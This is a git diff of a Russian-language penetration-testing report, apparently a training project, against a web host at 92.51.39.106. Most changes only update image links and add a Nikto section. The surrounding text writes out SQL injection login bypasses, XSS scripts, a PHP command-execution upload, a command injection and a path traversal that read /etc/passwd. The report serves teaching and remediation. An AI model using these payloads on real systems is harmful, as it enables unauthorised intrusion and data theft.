@@ -21,16 +21,16 @@
 * Электронная почта: abuse@timeweb.ru
 * Телефоны: +78122481081, +74950331081
 
-![png](image.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image.png)
 
-![png](image-1.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-1.png)
 
 **Shodan**-поисковая система, позволяющая пользователям искать различные типы серверов, подключённых к сети Интернет, с использованием различных фильтров.
 
 Результат запроса в Shodah: [(https://www.shodan.io/host/92.51.39.106](https://www.shodan.io/host/92.51.39.106)
 
-![png](image-2.png)
-![png](image-3.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-2.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-3.png)
 
 Найдены открытые порты:
 
@@ -40,25 +40,25 @@
 
 Используется версия PHP 5.5.9 на сервере. На сайте **cvedetails.com** данная версия указана как устаревшая со множеством уязвимостей:
 
-![png](image-7.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-7.png)
 
 **Google Dorking** - поисковая система интернета. 
 
 Скрытые страницы и конфиденциальные файлы не обнаружены:
 
-![png](image-4.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-4.png)
 
-![png](image-5.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-5.png)
 
-![png](image-6.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-6.png)
 
 **check-risk.ru**
 
-![png](image-15.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-15.png)
 
 **whatweb**
 
-![png](image-44.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-44.png)
 
 Найдено два сервиса:
 
@@ -68,7 +68,7 @@
 
 На  https://www.cvedetails.com найдены уязвимости по данны версии сервера TornadoServer:
 
-![png](image-46.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-46.png)
 
 На основании вышеизложенного мы выбираем цели  для сканирования - http://92.51.39.106:8050/  и http://92.51.39.106:7788/ 
 
@@ -77,22 +77,22 @@
 
 **NMap**
 
-![png](image-8.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-8.png)
 
 Результат:
 Открыт порт 22 - OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0).
 
 **Spiderfoot**
 
-![png](image-11.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-11.png)
 
-![png](image-9.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-9.png)
 
-![png](image-10.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-10.png)
 
-![png](image-13.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-13.png)
 
-![png](image-14.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-14.png)
 
 Результат:
 
@@ -100,9 +100,16 @@
 * Cеть 92.51.39.0/24
 * Эл.почта: abuse@timeweb.ru
 
+**Nikto Scan**
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-50.png)
+
+
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-49.png)
+
+
 **Acunetix**
 
-![png](image-25.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-25.png)
 
 Результат:
 * Уязвимость критического уровня является - SQL Injection.
@@ -113,13 +120,13 @@
 **zaproxy**
 
 8050
-![png](image-24.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-24.png)
 
 Файл с отчетом: [отчет 8050](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/2025-11-06-ZAP-Report-.html)
 
 7788
 
-![png](image-16.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-16.png)
 
 Файл с отчетом: [отчет 7788](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/port7788-ZAP-Report-.html)
 
@@ -134,8 +141,8 @@
 
 **SQL Injections**
 По адресу http://92.51.39.106:8050/users/login.php, в поле Username вводим admin' or '1'='1'#, а в поле Password, например- 123:
-![png](image-20.png)
-![png](image-21.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-20.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-21.png)
 
 **Cross Site Scripting (DOM Based)**
 
@@ -145,21 +152,21 @@
 <script>alert('simple attack')</script>
 ```
 
-![png](image-19.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-19.png)
 
 После сохранения комментария видим, что атака удалась:
 
-![png](image-26.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-26.png)
 
 **Cross Site Scripting (Persistent)**
 Введем в форму отправки комментария код:
 ```
 <script>alert('You are hacked!')</script>
 ```
-![png](image-27.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-27.png)
 
 После сохранения комментария код выполняется:
-![png](image-28.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-28.png)
 
 **Cross Site Scripting (Reflected)**
 На сайте в форме поиска введем в строку поиска код :
@@ -167,12 +174,12 @@
 <a href="http://92.51.39.106:8050/" onclick="alert('Cross Site Scripting (Reflected) attack!'); return false;">Ссылка на x-сайт </a>
 ```
 
-![png](image-29.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-29.png)
 
-![png](image-30.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-30.png)
 
 По ссылке получим сообщение в браузере:
-![png](image-31.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-31.png)
 
 **Local File Inclusion**
  Cоздадим файл file.php следующего содержания:
@@ -189,17 +196,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <input type="submit" value="Run command!">
 </form>
  ```
-![png](image-32.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-32.png)
 
-![png](image-33.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-33.png)
 
 Файл загружен:
 
-![png](image-45.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-45.png)
 
 Код выполнился:
 
-![png](image-47.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-47.png)
 
 Вводим:
 
@@ -207,7 +214,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 whoami; pwd; cat /etc/passwd
 ```
 
-![png](image-48.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-48.png)
 
 
 #### Цель: http://92.51.39.106:7788
@@ -215,11 +222,11 @@ whoami; pwd; cat /etc/passwd
 **SQL Injections**
 По адресу http://92.51.39.106:7788/login.html  в поле Username введем admin' or '1'='1--, а в поле Password, например - 123:
 
-![png](image-17.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-17.png)
 
 Авторизация успешна:
 
-![png](image-18.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-18.png)
 
  **Command Execution** 
 
@@ -228,7 +235,7 @@ whoami; pwd; cat /etc/passwd
  ``` 127.0.0.1&cat /etc/passwd&
 ```
 
-![png](image-34.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-34.png)
 
 **Cross Site Scripting (DOM Based)**
 
@@ -237,34 +244,36 @@ whoami; pwd; cat /etc/passwd
 ```
 <script>alert('simple attack')</script>
 ```
-![png](image-38.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-38.png)
 
-![png](image-39.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-39.png)
 
 **Cross Site Scripting (Reflected)**
 На сайте в форме поиска введем в строку поиска код :
 ```
 <a href="http://92.51.39.106:8050/" onclick="alert('Cross Site Scripting (Reflected) attack!'); return false;">Ссылка на x-сайт </a>
 ```
-![png](image-40.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-40.png)
 
-![png](image-41.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-41.png)
 
  Кликнем по ссылке, и получим сообщение в браузере:
 
-![png](image-42.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-42.png)
 
 **Path Traversal**
 ```
  http://92.51.39.106:7788/read?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 
 ```
-![png](image-43.png)
+![png](https://github.com/Mikhalkevich-N/Diplom-Track-Penetration_Testing/blob/main/img/image-43.png)
 
 
 
 
 ### Рекомендации по исправлению уязвимостей.
+
+**Рекомендуется обновить устаревшие версии ОС и сервисов.**
 
 **SQL Injections**
 Для защиты от SQL-инъекций (атак с внедрением SQL-кода) рекомендуется:
